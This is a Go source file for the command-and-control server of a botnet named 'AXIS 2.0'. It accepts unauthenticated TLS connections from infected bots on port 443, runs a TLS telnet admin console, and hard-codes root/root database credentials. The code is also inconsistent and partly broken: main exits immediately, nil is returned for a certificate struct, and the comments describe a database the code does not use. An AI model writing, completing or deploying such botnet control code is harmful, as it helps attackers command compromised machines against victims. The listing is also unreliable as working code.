package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"net"
	"os"
	"time"

	"crypto/x509/pkix"
)

// ============================================================================
// AXIS 2.0 C&C SERVER CONFIGURATION
// ============================================================================
// Database: JSON file-based database (database.json)
// Bot Connections: TLS 1.3 encrypted on port 443 (HTTPS port)
// Admin Access: TLS-encrypted telnet on port 6969
// API: REST API on port 3779 (optional)
// ============================================================================
const DatabaseAddr string = "127.0.0.1:3306"
const DatabaseUser string = "root"
const DatabasePass string = "root"
const DatabaseTable string = "AXIS2"

// C&C Server listen address for bots (TLS 1.3 on port 443)
const CNCListenAddr string = "0.0.0.0:443"

// Bot TLS Certificate and Key paths
const BotTLSCertPath string = "bot_tls_cert.pem"
const BotTLSKeyPath string = "bot_tls_key.pem"

// Encrypted Telnet Server listen address (TLS-wrapped telnet for admin access on port 6969)
const TelnetTLSListenAddr string = "0.0.0.0:6969"

// TLS Certificate and Key file paths (will be auto-generated if not exists)
const TLSCertPath string = "tls_cert.pem"
const TLSKeyPath string = "tls_key.pem"

// API Server listen address (set to empty string to disable API)
const APIListenAddr string = "0.0.0.0:3779"

// ============================================================================

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
	// Load or create TLS certificate for bot connections
	botCert, err := getOrCreateBotTLSCertificate()
	if err != nil {
		fmt.Printf("Failed to load bot TLS certificate: %v\n", err)
		return
	}

	// TLS config for bot connections (TLS 1.3)
	botTLSConfig := &tls.Config{
		Certificates: []tls.Certificate{botCert},
		MinVersion:   tls.VersionTLS13, // TLS 1.3 only
		CipherSuites: []uint16{
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
		},
	}

	botListener, err := tls.Listen("tcp", CNCListenAddr, botTLSConfig)
	if err != nil {
		fmt.Printf("Failed to start bot TLS listener: %v\n", err)
		return
	}

	go func() {
		fmt.Printf("AXIS 2.0 Bot Server (TLS 1.3) listening on %s\n", CNCListenAddr)
		for {
			conn, err := botListener.Accept()
			if err != nil {
				fmt.Printf("Failed to accept bot connection: %v\n", err)
				break
			}
			go handleBotConnection(conn)
		}
	}()

	// Start Encrypted Telnet server for admin connections (TLS-wrapped)
	if TelnetTLSListenAddr != "" {
		cert, err := getOrCreateTLSCertificate()
		if err != nil {
			fmt.Printf("Failed to load TLS certificate: %v\n", err)
			return
		}

		tlsConfig := &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12, // Only TLS 1.2 and above
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			},
		}

		tlsListener, err := tls.Listen("tcp", TelnetTLSListenAddr, tlsConfig)
		if err != nil {
			fmt.Printf("Failed to start encrypted telnet listener: %v\n", err)
			return
		}

		go func() {
			fmt.Printf("AXIS 2.0 Encrypted Telnet Server (TLS) listening on %s\n", TelnetTLSListenAddr)
			for {
				conn, err := tlsListener.Accept()
				if err != nil {
					fmt.Printf("Failed to accept encrypted telnet connection: %v\n", err)
					break
				}
				go NewAdmin(conn).Handle()
			}
		}()
	}

	// Start API server if configured
	if APIListenAddr != "" {
		api, err := net.Listen("tcp", APIListenAddr)
		if err != nil {
			fmt.Printf("Failed to start API server: %v\n", err)
			return
		}

		go func() {
			for {
				conn, err := api.Accept()
				if err != nil {
					break
				}
				go apiHandler(conn)
			}
		}()
	}
}

// Ultra-simplified TLS bot connection - no auth, just TLS
func handleBotConnection(conn net.Conn) {
	defer conn.Close()

	// Set handshake timeout
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	// Send immediate ACK - no authentication needed
	conn.Write([]byte{0x00, 0x01})

	// Clear deadline and start bot session
	conn.SetDeadline(time.Time{})
	NewBot(conn, 0x01, "").Handle()
}

func apiHandler(conn net.Conn) {
	defer conn.Close()
	NewApi(conn).Handle()
}

func readXBytes(conn net.Conn, buf []byte) error {
	tl := 0

	for tl < len(buf) {
		n, err := conn.Read(buf[tl:])
		if err != nil {
			return err
		}
		if n <= 0 {
			return errors.New("Connection closed unexpectedly")
		}
		tl += n
	}

	return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
	return uint32(prefix >> (32 - netmask))
}

// getOrCreateTLSCertificate loads or generates a TLS certificate
func getOrCreateTLSCertificate() (tls.Certificate, error) {
	// Try to read existing certificate and key
	certBytes, certErr := os.ReadFile(TLSCertPath)
	keyBytes, keyErr := os.ReadFile(TLSKeyPath)

	if certErr == nil && keyErr == nil {
		cert, err := tls.X509KeyPair(certBytes, keyBytes)
		if err == nil {
			return cert, nil
		}
	}

	// Generate new self-signed certificate
	fmt.Println("Generating new TLS certificate...")

	// Generate private key
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	// Create certificate template
	template := x509.Certificate{
		SerialNumber: nil,
		Subject: pkix.Name{
			Organization: []string{"AXIS 2.0"},
			CommonName:   "AXIS 2.0 C&C Server",
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour), // Valid for 1 year
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	// Create certificate
	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return nil, err
	}

	// Encode certificate to PEM
	certPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "CERTIFICATE",
		Bytes: certDER,
	})

	// Encode private key to PEM
	keyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(privateKey),
	})

	// Save certificate
	if err := os.WriteFile(TLSCertPath, certPEM, 0644); err != nil {
		return nil, err
	}

	// Save private key with restricted permissions
	if err := os.WriteFile(TLSKeyPath, keyPEM, 0600); err != nil {
		return nil, err
	}

	fmt.Printf("TLS certificate generated: %s, %s\n", TLSCertPath, TLSKeyPath)

	// Load and return certificate
	return tls.X509KeyPair(certPEM, keyPEM)
}

// getOrCreateBotTLSCertificate loads or generates a TLS certificate for bot connections
func getOrCreateBotTLSCertificate() (tls.Certificate, error) {
	// Try to read existing certificate and key
	certBytes, certErr := os.ReadFile(BotTLSCertPath)
	keyBytes, keyErr := os.ReadFile(BotTLSKeyPath)

	if certErr == nil && keyErr == nil {
		cert, err := tls.X509KeyPair(certBytes, keyBytes)
		if err == nil {
			return cert, nil
		}
	}

	// Generate new self-signed certificate for bot connections
	fmt.Println("Generating new bot TLS certificate...")

	// Generate private key
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	// Create certificate template
	template := x509.Certificate{
		SerialNumber: nil,
		Subject: pkix.Name{
			Organization: []string{"AXIS 2.0"},
			CommonName:   "AXIS 2.0 Bot Server",
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour), // Valid for 1 year
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	// Create certificate
	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return nil, err
	}

	// Encode certificate to PEM
	certPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "CERTIFICATE",
		Bytes: certDER,
	})

	// Encode private key to PEM
	keyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(privateKey),
	})

	// Save certificate
	if err := os.WriteFile(BotTLSCertPath, certPEM, 0644); err != nil {
		return nil, err
	}

	// Save private key with restricted permissions
	if err := os.WriteFile(BotTLSKeyPath, keyPEM, 0600); err != nil {
		return nil, err
	}

	fmt.Printf("Bot TLS certificate generated: %s, %s\n", BotTLSCertPath, BotTLSKeyPath)

	// Load and return certificate
	return tls.X509KeyPair(certPEM, keyPEM)
}
